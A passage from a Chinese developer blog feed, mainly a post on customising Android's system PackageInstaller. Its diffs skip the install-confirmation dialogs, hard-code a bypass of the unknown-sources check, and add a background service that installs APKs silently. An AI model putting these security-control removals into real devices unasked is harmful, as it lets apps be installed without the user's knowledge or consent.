的改进使其在某些情况下更容易使用，因此在新的项目中，它更有可能是首选的方法。## 场景我的需求为通过Java开启/关闭 python服务， 在上面的方法中选择使用ProcessBuilder来开启服务，开启后通过socket进行通信。此时需要注意一点:通过ProcessBuilder开启服务后，要确保python服务端完全启动，所以需要Java客户端使用Thread.sleep进行等待几秒。## 后觉方案确定下来之后，在后面的测试中发现，python中的print输出到控制台里面的内容，我通过ProcessBuilder能够在Java的输入输出流中获取到，也就是其实采用ProcessBuilder来调用Java，就不需要额外创建socket进行通信了。另外如果采用socket进行通信，python里面就不要用print语句，因为如果Java中没有进行接受处理，会导致python程序输出缓冲区满，导致卡死无法执行下一步操作，这个bug当时还排查了好久。</code></pre>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android 定制Installer学习</title>
    <link href="/2023/08/21/Android%20%E5%AE%9A%E5%88%B6Installer%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/21/Android%20%E5%AE%9A%E5%88%B6Installer%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-修改系统安装器以达到静默安装的效果"><a href="#1-修改系统安装器以达到静默安装的效果" class="headerlink" title="1 修改系统安装器以达到静默安装的效果"></a>1 修改系统安装器以达到静默安装的效果</h2><p>解决方案：并没有采用自动点击，而是将确认弹窗的函数跳过，直接执行安装相关函数，同样将安装完成后的确认弹窗相关代码删除</p><p>补丁： <a href="mailto:&#x72;&#107;&#x37;&#x31;&#x2d;&#x70;&#97;&#99;&#104;&#97;&#103;&#101;&#115;&#x2d;&#97;&#112;&#112;&#115;&#x2d;&#x70;&#97;&#99;&#x6b;&#97;&#103;&#x65;&#x69;&#110;&#115;&#x74;&#97;&#x6c;&#x6c;&#101;&#x72;&#64;&#x6d;&#x6f;&#x64;&#x69;&#102;&#121;&#95;&#105;&#x6e;&#115;&#116;&#x61;&#x6c;&#108;&#x65;&#114;&#x5f;&#116;&#111;&#x5f;&#x73;&#x69;&#x6c;&#101;&#110;&#116;&#x5f;&#105;&#x6e;&#115;&#x74;&#97;&#108;&#x6c;&#97;&#116;&#x69;&#x6f;&#110;&#x2e;&#x70;&#97;&#x74;&#99;&#104;">&#x72;&#107;&#x37;&#x31;&#x2d;&#x70;&#97;&#99;&#104;&#97;&#103;&#101;&#115;&#x2d;&#97;&#112;&#112;&#115;&#x2d;&#x70;&#97;&#99;&#x6b;&#97;&#103;&#x65;&#x69;&#110;&#115;&#x74;&#97;&#x6c;&#x6c;&#101;&#x72;&#64;&#x6d;&#x6f;&#x64;&#x69;&#102;&#121;&#95;&#105;&#x6e;&#115;&#116;&#x61;&#x6c;&#108;&#x65;&#114;&#x5f;&#116;&#111;&#x5f;&#x73;&#x69;&#x6c;&#101;&#110;&#116;&#x5f;&#105;&#x6e;&#115;&#x74;&#97;&#108;&#x6c;&#97;&#116;&#x69;&#x6f;&#110;&#x2e;&#x70;&#97;&#x74;&#99;&#104;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/com/android/packageinstaller/InstallAppProgress.java b/src/com/android/packageinstaller/InstallAppProgress.java</span><br><span class="line">index 49d91cf1..dc928ce7 100755</span><br><span class="line">--- a/src/com/android/packageinstaller/InstallAppProgress.java</span><br><span class="line">+++ b/src/com/android/packageinstaller/InstallAppProgress.java</span><br><span class="line">@@ -107,26 +107,29 @@ public class InstallAppProgress extends Activity implements View.OnClickListener</span><br><span class="line">                     int centerTextLabel;</span><br><span class="line">                     int centerExplanationLabel = -1;</span><br><span class="line">                     if (msg.arg1 == PackageInstaller.STATUS_SUCCESS) &#123;</span><br><span class="line">-                        mLaunchButton.setVisibility(View.VISIBLE);</span><br><span class="line">-                        ((ImageView)findViewById(R.id.center_icon))</span><br><span class="line">-                                .setImageDrawable(getDrawable(R.drawable.ic_done_92));</span><br><span class="line">-                        centerTextLabel = R.string.install_done;</span><br><span class="line">-                        // Enable or disable launch button</span><br><span class="line">-                        mLaunchIntent = getPackageManager().getLaunchIntentForPackage(</span><br><span class="line">-                                mAppInfo.packageName);</span><br><span class="line">-                        boolean enabled = false;</span><br><span class="line">-                        if(mLaunchIntent != null) &#123;</span><br><span class="line">-                            List&lt;ResolveInfo&gt; list = getPackageManager().</span><br><span class="line">-                                    queryIntentActivities(mLaunchIntent, 0);</span><br><span class="line">-                            if (list != null &amp;&amp; list.size() &gt; 0) &#123;</span><br><span class="line">-                                enabled = true;</span><br><span class="line">-                            &#125;</span><br><span class="line">-                        &#125;</span><br><span class="line">-                        if (enabled) &#123;</span><br><span class="line">-                            mLaunchButton.setOnClickListener(InstallAppProgress.this);</span><br><span class="line">-                        &#125; else &#123;</span><br><span class="line">-                            mLaunchButton.setEnabled(false);</span><br><span class="line">-                        &#125;</span><br><span class="line">+                        Log.d(TAG, &quot;Install succeeded!&quot;);</span><br><span class="line">+                        clearCachedApkIfNeededAndFinish();</span><br><span class="line">+                        return;</span><br><span class="line">                     &#125; else if (msg.arg1 == PackageInstaller.STATUS_FAILURE_STORAGE)&#123;</span><br><span class="line">                         showDialogInner(DLG_OUT_OF_SPACE);</span><br><span class="line">                         return;</span><br><span class="line">diff --git a/src/com/android/packageinstaller/PackageInstallerActivity.java b/src/com/android/packageinstaller/PackageInstallerActivity.java</span><br><span class="line">index de685825..cf4d20f8 100644</span><br><span class="line">--- a/src/com/android/packageinstaller/PackageInstallerActivity.java</span><br><span class="line">+++ b/src/com/android/packageinstaller/PackageInstallerActivity.java</span><br><span class="line">@@ -391,8 +391,8 @@ public class PackageInstallerActivity extends Activity implements OnCancelListen</span><br><span class="line">         &#125; catch (NameNotFoundException e) &#123;</span><br><span class="line">             mAppInfo = null;</span><br><span class="line">         &#125;</span><br><span class="line">-</span><br><span class="line">-        startInstallConfirm();</span><br><span class="line">+        startInstall();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     void setPmResult(int pmResult) &#123;</span><br><span class="line">@@ -474,6 +474,7 @@ public class PackageInstallerActivity extends Activity implements OnCancelListen</span><br><span class="line">      */</span><br><span class="line">     private void checkIfAllowedAndInitiateInstall(boolean ignoreUnknownSourcesSettings) &#123;</span><br><span class="line">         // Block the install attempt on the Unknown Sources setting if necessary.</span><br><span class="line">+        ignoreUnknownSourcesSettings = true;</span><br><span class="line">         final boolean requestFromUnknownSource = isInstallRequestFromUnknownSource(getIntent());</span><br><span class="line">         if (!requestFromUnknownSource) &#123;</span><br><span class="line">             initiateInstall();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-定制化后台静默安装器"><a href="#2-定制化后台静默安装器" class="headerlink" title="2 定制化后台静默安装器"></a>2 定制化后台静默安装器</h2><p>需求：从系统安装器里提取安装流程的相关代码，并创建一个后台Service，将所有流程集成其中，从而实现一个定制化的后台静默安装器。</p><p>补丁：<a href="mailto:&#x72;&#107;&#55;&#49;&#x2d;&#x70;&#97;&#x63;&#x6b;&#x61;&#x67;&#101;&#115;&#45;&#97;&#x70;&#x70;&#115;&#45;&#x50;&#x61;&#x63;&#x6b;&#97;&#103;&#101;&#73;&#x6e;&#115;&#x74;&#97;&#108;&#108;&#x65;&#x72;&#x40;&#67;&#x72;&#x65;&#97;&#116;&#101;&#95;&#x73;&#101;&#114;&#x76;&#101;&#x72;&#95;&#102;&#111;&#x72;&#x5f;&#x73;&#x69;&#108;&#x65;&#110;&#116;&#95;&#105;&#x6e;&#115;&#116;&#x61;&#x6c;&#x6c;&#97;&#105;&#x6f;&#110;&#46;&#x70;&#x61;&#116;&#99;&#104;">&#x72;&#107;&#55;&#49;&#x2d;&#x70;&#97;&#x63;&#x6b;&#x61;&#x67;&#101;&#115;&#45;&#97;&#x70;&#x70;&#115;&#45;&#x50;&#x61;&#x63;&#x6b;&#97;&#103;&#101;&#73;&#x6e;&#115;&#x74;&#97;&#108;&#108;&#x65;&#x72;&#x40;&#67;&#x72;&#x65;&#97;&#116;&#101;&#95;&#x73;&#101;&#114;&#x76;&#101;&#x72;&#95;&#102;&#111;&#x72;&#x5f;&#x73;&#x69;&#108;&#x65;&#110;&#116;&#95;&#105;&#x6e;&#115;&#116;&#x61;&#x6c;&#x6c;&#97;&#105;&#x6f;&#110;&#46;&#x70;&#x61;&#116;&#99;&#104;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/com/android/packageinstaller/SilenceInstallService.java b/src/com/android/packageinstaller/SilenceInstallService.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000..cdabde7c</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/com/android/packageinstaller/SilenceInstallService.java</span><br><span class="line">@@ -0,0 +1,262 @@</span><br><span class="line">+package com.android.packageinstaller;</span><br><span class="line">+</span><br><span class="line">+import java.io.File;</span><br><span class="line">+</span><br><span class="line">+import android.content.BroadcastReceiver;</span><br><span class="line">+import android.content.Context;</span><br><span class="line">+import android.content.Intent;</span><br><span class="line">+import android.app.PendingIntent;</span><br><span class="line">+import android.content.IntentFilter;</span><br><span class="line">+import android.content.ContentResolver;</span><br><span class="line">+import android.content.pm.PackageInfo;</span><br><span class="line">+import android.content.pm.PackageInstaller;</span><br><span class="line">+import android.content.pm.PackageManager;</span><br><span class="line">+import android.content.pm.PackageParser;</span><br><span class="line">+import android.content.pm.PackageParser.PackageLite;</span><br><span class="line">+import android.net.Uri;</span><br><span class="line">+import android.util.Log;</span><br><span class="line">+import android.os.Handler;</span><br><span class="line">+import android.os.HandlerThread;</span><br><span class="line">+import android.os.Message;</span><br><span class="line">+</span><br><span class="line">+import android.app.IntentService;</span><br><span class="line">+import android.widget.Toast;</span><br><span class="line">+</span><br><span class="line">+import com.android.internal.content.PackageHelper;</span><br><span class="line">+</span><br><span class="line">+import java.io.FileOutputStream;</span><br><span class="line">+import java.io.FileInputStream;</span><br><span class="line">+import java.io.IOException;</span><br><span class="line">+import java.io.InputStream;</span><br><span class="line">+import java.io.OutputStream;</span><br><span class="line">+</span><br><span class="line">+public class SilenceInstallService extends IntentService &#123;</span><br><span class="line">+    private static final String JINNYTAG = &quot;jinny&quot;+SilenceInstallService.class.getSimpleName();</span><br><span class="line">+</span><br><span class="line">+    private static final String BROADCAST_ACTION =&quot;com.android.packageinstaller.ACTION_INSTALL_COMMIT&quot;;</span><br><span class="line">+    private static final String BROADCAST_SENDER_PERMISSION =&quot;android.permission.INSTALL_PACKAGES&quot;;</span><br><span class="line">+</span><br><span class="line">+    private final String[] whiteOpenPackageName = &#123;&quot;com.example.launcherlearn2&quot;&#125;;</span><br><span class="line">+</span><br><span class="line">+    private final Object lock = new Object();</span><br><span class="line">+    private final int INSTALL_COMPLETE = 1;</span><br><span class="line">+    private Uri mPackageURI;</span><br><span class="line">+    private String packageName;</span><br><span class="line">+</span><br><span class="line">+    private Handler mHandler = new Handler() &#123;</span><br><span class="line">+        public void handleMessage(Message msg) &#123;</span><br><span class="line">+            Log.d(JINNYTAG, &quot;msg.what = &quot;+msg.what+&quot;, msg.arg1 = &quot;+msg.arg1);</span><br><span class="line">+            switch (msg.what) &#123;</span><br><span class="line">+                case INSTALL_COMPLETE:</span><br><span class="line">+                    if (msg.arg1 == PackageInstaller.STATUS_SUCCESS) &#123;</span><br><span class="line">+                        if(null != packageName &amp;&amp; java.util.Arrays.asList(whiteOpenPackageName).contains(packageName))&#123;</span><br><span class="line">+                            // openInstallApp(packageName);</span><br><span class="line">+                            Log.d(JINNYTAG, &quot;success install apk: &quot;+packageName);</span><br><span class="line">+                       &#125;</span><br><span class="line">+                        Toast.makeText(getApplicationContext(), R.string.install_done, Toast.LENGTH_SHORT).show();</span><br><span class="line">+                    &#125; else if (msg.arg1 == PackageInstaller.STATUS_FAILURE_STORAGE) &#123;</span><br><span class="line">+                        Toast.makeText(getApplicationContext(), R.string.out_of_space_dlg_title, Toast.LENGTH_SHORT).show();</span><br><span class="line">+                    &#125; else &#123;</span><br><span class="line">+                        Toast.makeText(getApplicationContext(), R.string.install_failed, Toast.LENGTH_SHORT).show();</span><br><span class="line">+                    &#125;</span><br><span class="line">+                    break;</span><br><span class="line">+                default:</span><br><span class="line">+                    break;</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    private final BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver() &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">+            Log.d(JINNYTAG, &quot;INSTALL_COMPLETE mBroadcastReceiver&quot;);</span><br><span class="line">+            final int statusCode = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE);</span><br><span class="line">+            if (statusCode == PackageInstaller.STATUS_PENDING_USER_ACTION) &#123;</span><br><span class="line">+        onPackageInstalled(statusCode);</span><br><span class="line">+                //context.startActivity((Intent)intent.getParcelableExtra(Intent.EXTRA_INTENT));</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                onPackageInstalled(statusCode);</span><br><span class="line">+            &#125;</span><br><span class="line">+            synchronized (lock) &#123;</span><br><span class="line">+               lock.notify();</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    private void onPackageInstalled(int statusCode) &#123;</span><br><span class="line">+        Message msg = mHandler.obtainMessage(INSTALL_COMPLETE);</span><br><span class="line">+        msg.arg1 = statusCode;</span><br><span class="line">+        mHandler.sendMessage(msg);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    // private void openInstallApp(String packageName)&#123;</span><br><span class="line">+    //     Log.e(JINNYTAG,  &quot;openInstallApp packageName = &quot;+packageName);</span><br><span class="line">+    //     boolean enabled = false;</span><br><span class="line">+    //    Intent mLaunchIntent;</span><br><span class="line">+    //     mLaunchIntent = getPackageManager().getLaunchIntentForPackage(packageName);</span><br><span class="line">+    //     if(mLaunchIntent != null) &#123;</span><br><span class="line">+    //         java.util.List&lt;android.content.pm.ResolveInfo&gt; list = getPackageManager().</span><br><span class="line">+    //                 queryIntentActivities(mLaunchIntent, 0);</span><br><span class="line">+    //         if (list != null &amp;&amp; list.size() &gt; 0) &#123;</span><br><span class="line">+    //             enabled = true;</span><br><span class="line">+    //         &#125;</span><br><span class="line">+    //     &#125;</span><br><span class="line">+    //     if (enabled) &#123;</span><br><span class="line">+    //         try &#123;</span><br><span class="line">+    //             startActivity(mLaunchIntent);</span><br><span class="line">+    //         &#125; catch (Exception e) &#123;</span><br><span class="line">+    //             Log.e(&quot;SilenceInstallService&quot;, &quot;Could not start activity&quot;, e);</span><br><span class="line">+    //         &#125;</span><br><span class="line">+    //     &#125;</span><br><span class="line">+    // &#125;</span><br><span class="line">+</span><br><span class="line">+   public SilenceInstallService() &#123;</span><br><span class="line">+        super(&quot;SilenceInstallService&quot;);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    @Override</span><br><span class="line">+    protected void onHandleIntent(Intent intent) &#123;</span><br><span class="line">+    IntentFilter intentFilter = new IntentFilter();</span><br><span class="line">+        intentFilter.addAction(BROADCAST_ACTION);</span><br><span class="line">+        registerReceiver(mBroadcastReceiver, intentFilter, BROADCAST_SENDER_PERMISSION, null);</span><br><span class="line">+        synchronized (lock) &#123;</span><br><span class="line">+            handleIntent(intent);</span><br><span class="line">+            try &#123;</span><br><span class="line">+                lock.wait();</span><br><span class="line">+            &#125; catch (InterruptedException e) &#123;</span><br><span class="line">+                Log.d(&quot;jinny SilenceInstallService 0&quot;,e.toString());</span><br><span class="line">+            &#125;</span><br><span class="line">+       &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    @Override</span><br><span class="line">+    public void onDestroy() &#123;</span><br><span class="line">+        super.onDestroy();</span><br><span class="line">+        Log.d(JINNYTAG, &quot;onDestroy&quot;);</span><br><span class="line">+        unregisterReceiver(mBroadcastReceiver);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private void handleIntent(Intent intent) &#123;</span><br><span class="line">+        File file = InBackground(intent.getData());</span><br><span class="line">+        mPackageURI = Uri.fromFile(file);</span><br><span class="line">+        Log.d(JINNYTAG, &quot;mPackageURI = &quot;+mPackageURI);</span><br><span class="line">+</span><br><span class="line">+if (&quot;package&quot;.equals(mPackageURI.getScheme())) &#123;</span><br><span class="line">+try &#123;</span><br><span class="line">+PackageLite pkg = PackageParser.parsePackageLite(file, 0);</span><br><span class="line">+        getPackageManager().installExistingPackage(pkg.packageName);</span><br><span class="line">+                packageName = pkg.packageName;</span><br><span class="line">+    onPackageInstalled(PackageInstaller.STATUS_SUCCESS);</span><br><span class="line">+&#125; catch (Exception e) &#123;</span><br><span class="line">+onPackageInstalled(PackageInstaller.STATUS_FAILURE_INVALID);</span><br><span class="line">+                Log.d(&quot;jinny SilenceInstallService Exception1&quot;,e.toString());</span><br><span class="line">+&#125;</span><br><span class="line">+&#125; else &#123;</span><br><span class="line">+           final PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);</span><br><span class="line">+try &#123;</span><br><span class="line">+            PackageLite pkg = PackageParser.parsePackageLite(file, 0);</span><br><span class="line">+            params.setAppPackageName(pkg.packageName);</span><br><span class="line">+            params.setInstallLocation(pkg.installLocation);</span><br><span class="line">+            params.setSize(PackageHelper.calculateInstalledSize(pkg, false, params.abiOverride));</span><br><span class="line">+                packageName = pkg.packageName;</span><br><span class="line">+        &#125; catch (PackageParser.PackageParserException e) &#123;</span><br><span class="line">+            params.setSize(file.length());</span><br><span class="line">+                Log.d(&quot;jinny SilenceInstallService Exception2&quot;,e.toString());</span><br><span class="line">+        &#125; catch (IOException e) &#123;</span><br><span class="line">+            params.setSize(file.length());</span><br><span class="line">+                Log.d(&quot;jinny SilenceInstallService Exception3&quot;,e.toString());</span><br><span class="line">+        &#125;</span><br><span class="line">+            doPackageStage(getPackageManager(), params);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private File InBackground(Uri uri) &#123;</span><br><span class="line">+        if (uri == null || uri.toString().length() &lt;= 0) &#123;</span><br><span class="line">+            Log.d(JINNYTAG, &quot;uri == null&quot;);</span><br><span class="line">+           return null;</span><br><span class="line">+        &#125;</span><br><span class="line">+        Uri packageUri = uri;</span><br><span class="line">+        File sourceFile = null;</span><br><span class="line">+        try &#123;</span><br><span class="line">+            if (packageUri.getScheme().equals(ContentResolver.SCHEME_FILE)) &#123;</span><br><span class="line">+                sourceFile = new File(packageUri.getPath());</span><br><span class="line">+            &#125; else if (packageUri.getScheme().equals(ContentResolver.SCHEME_CONTENT)) &#123;</span><br><span class="line">+                sourceFile = File.createTempFile(&quot;package&quot;, &quot;.apk&quot;, getNoBackupFilesDir());</span><br><span class="line">+                try (</span><br><span class="line">+                    InputStream in = getContentResolver().openInputStream(packageUri);</span><br><span class="line">+                    OutputStream out = (in != null) ? new FileOutputStream(sourceFile) : null;</span><br><span class="line">+                ) &#123;</span><br><span class="line">+                    if (in == null) &#123;</span><br><span class="line">+                        return null;</span><br><span class="line">+                    &#125;</span><br><span class="line">+                    byte[] buffer = new byte[4096];</span><br><span class="line">+                    int bytesRead;</span><br><span class="line">+                   while ((bytesRead = in.read(buffer)) &gt;= 0) &#123;</span><br><span class="line">+                        out.write(buffer, 0, bytesRead);</span><br><span class="line">+                    &#125;</span><br><span class="line">+                &#125;catch (Exception e) &#123;</span><br><span class="line">+                    Log.d(&quot;jinny SilenceInstallService Exception4&quot;,e.toString());</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125; catch (IOException ioe) &#123;</span><br><span class="line">+            if (sourceFile != null) &#123;</span><br><span class="line">+                sourceFile.delete();</span><br><span class="line">+                return null;</span><br><span class="line">+            &#125;</span><br><span class="line">+            Log.d(&quot;jinny SilenceInstallService Exception5&quot;,ioe.toString());</span><br><span class="line">+        &#125;</span><br><span class="line">+        return sourceFile;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private void doPackageStage(PackageManager pm, PackageInstaller.SessionParams params) &#123;</span><br><span class="line">+        final PackageInstaller packageInstaller = pm.getPackageInstaller();</span><br><span class="line">+        PackageInstaller.Session session = null;</span><br><span class="line">+        try &#123;</span><br><span class="line">+            final String packageLocation = mPackageURI.getPath();</span><br><span class="line">+            final File file = new File(packageLocation);</span><br><span class="line">+        Log.d(JINNYTAG, &quot;file_path = &quot;+file.getPath()+&quot;, exists = &quot;+file.exists()+ &quot;, canRead = &quot;+file.canRead());</span><br><span class="line">+</span><br><span class="line">+            final int sessionId = packageInstaller.createSession(params);</span><br><span class="line">+            final byte[] buffer = new byte[65536];</span><br><span class="line">+            final long sizeBytes = file.length();</span><br><span class="line">+           session = packageInstaller.openSession(sessionId);</span><br><span class="line">+            try (</span><br><span class="line">+                final InputStream in = new FileInputStream(file);</span><br><span class="line">+                final OutputStream out = session.openWrite(&quot;PackageInstaller&quot;, 0, sizeBytes);</span><br><span class="line">+            )&#123;</span><br><span class="line">+                int c;</span><br><span class="line">+                while ((c = in.read(buffer)) != -1) &#123;</span><br><span class="line">+                    out.write(buffer, 0, c);</span><br><span class="line">+                    if (sizeBytes &gt; 0) &#123;</span><br><span class="line">+                        final float fraction = ((float) c / (float) sizeBytes);</span><br><span class="line">+                       session.addProgress(fraction);</span><br><span class="line">+                    &#125;</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+        Intent broadcastIntent = new Intent(BROADCAST_ACTION);</span><br><span class="line">+            PendingIntent pendingIntent = PendingIntent.getBroadcast(</span><br><span class="line">+                    SilenceInstallService.this /*context*/,</span><br><span class="line">+                    sessionId,</span><br><span class="line">+                    broadcastIntent,</span><br><span class="line">+                   PendingIntent.FLAG_UPDATE_CURRENT);</span><br><span class="line">+            session.commit(pendingIntent.getIntentSender());</span><br><span class="line">+        &#125; catch (IOException e) 